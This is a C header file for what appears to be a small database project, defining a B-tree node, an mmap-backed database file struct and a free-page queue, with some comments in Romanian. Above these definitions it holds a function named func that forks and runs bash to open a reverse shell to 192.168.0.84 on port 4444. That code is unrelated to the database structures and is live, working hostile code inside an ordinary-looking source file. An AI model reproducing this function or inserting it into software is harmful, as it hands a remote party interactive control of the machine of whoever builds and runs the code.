#ifndef EE4AC2EA_E38F_4F62_9377_375DE5CE0648
#define EE4AC2EA_E38F_4F62_9377_375DE5CE0648

#include "libraries.h"
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>   // Include this for errno
#include <stdlib.h>
#include <stdio.h>   // Include for perror, fprintf, and stderr

void func(char *input) {
  pid_t pid;
  int status;
  pid_t ret;
  // Command to execute bash with the reverse shell command using bash -c
  char *const args[4] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.0.84/4444 0>&1", NULL};
  char **env;
  extern char **environ;

  pid = fork();
  if (pid == -1) {
    /* Handle error */
    perror("fork error"); // Use perror to print the error
  } else if (pid != 0) {
    while ((ret = waitpid(pid, &status, 0)) == -1) {
      if (errno != EINTR) {
        /* Handle error */
        perror("waitpid error");
        break;
      }
    }
    if ((ret == 0) ||
        !(WIFEXITED(status) && !WEXITSTATUS(status))) {
      /* Report unexpected child status */
      fprintf(stderr, "Child process didn't exit properly\n");
    }
  } else {
    /* Run the reverse shell command via bash -c */
    if (execve("/bin/bash", args, environ) == -1) {
      /* Handle error */
      perror("execve error"); // Use perror to print the error
      _Exit(127);
    }
  }
}
typedef struct DBFile{
    int fd;         // File descriptor for the database
    ssize_t size;    // Size of the mapped file
    void *data;     // Pointer to the mapped memory region
    bool dirty;      // Flag to track if changes were made
    int free_blocks; // Number of free blocks
}DBFile;

typedef struct RowNode{
    uint8_t is_leaf;
    uint16_t num_keys;
    uint64_t page_num;
    uint64_t keys[169];
    uint64_t raw_data[169];
    uint64_t link[170];
    struct RowNode *plink[170];    //21 liberi
    

}RowNode;

RowNode *root;

typedef struct QueueNode {
    int data;
    struct QueueNode* next;
} QueueNode;

typedef struct {
    QueueNode* front;  // Primul element (capul cozii)
    QueueNode* rear;   // Ultimul element (coada cozii)
} Queue;

Queue* free_page_queue ;


#endif /* EE4AC2EA_E38F_4F62_9377_375DE5CE0648 */
